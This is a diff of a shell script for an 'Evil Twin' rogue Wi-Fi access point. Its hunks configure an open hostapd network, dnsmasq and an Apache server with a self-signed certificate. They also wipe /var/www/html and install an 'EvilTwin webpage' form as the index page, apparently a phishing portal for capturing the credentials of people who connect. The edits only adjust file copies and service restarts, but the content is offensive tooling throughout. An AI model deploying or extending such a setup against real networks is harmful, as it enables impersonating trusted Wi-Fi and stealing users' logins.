@@ -238,8 +238,6 @@ ignore_broadcast_ssid=0
 wpa=0" >> /home/fap/hostapd.conf
 
 
-sudo rm /etc/hostapd/hostapd.conf 
-sudo cp /home/fap/hostapd.conf /etc/hostapd/hostapd.conf 
 sudo systemctl restart $AP
 }
 
@@ -280,10 +278,8 @@ sudo cp /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.conf.backup
 sudo cp /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/000-default.conf.backup
 
 echo "" > /etc/dnsmasq.conf 
-echo "" > /etc/hostapd/hostapd.conf 
 echo "" > /etc/apache2/sites-enabled/000-default.conf
 
-sudo cp hostapd.conf /etc/hostapd/hostapd.conf 
 sudo cp dnsmasq.conf /etc/dnsmasq.conf 
 sudo cp 000-default.conf /etc/apache2/sites-enabled/000-default.conf
 
@@ -291,8 +287,7 @@ echo "Cleaning files on /var/www/html and copying EvilTwin webpage on /var/www/h
 
 sudo rm -rf /var/www/html/* &&
 sudo cp -r css/ php/ images/ form.html /var/www/html &&
-sudo mv /var/www/html/form.html /var/www/html/index.html
-
+sudo mv /var/www/html/form.html /var/www/html/index.html &&
 
 echo "Restarting services..."
 
@@ -348,7 +343,7 @@ sudo a2enmod ssl &&
 sudo a2enmod rewrite
 sudo openssl req --new -x509 -days 365 -out /home/fap/cert.pem -keyout /home/fap/cert.key
 sudo cp /home/fap/000-default.conf /etc/apache2/sites-enabled/000-default.conf
-sudo systemctl restart $Server
+sudo systemctl start $Server
 }
 
 
@@ -417,6 +412,7 @@ sudo rm -r /etc/dnsmasq.conf
 sudo rm -r /home/fap/dnsmasq.conf
 DHCP_DNS
 sudo cp /home/fap/dnsmasq.conf /etc/dnsmasq.conf
+sudo service $DD restart
 }
 
 
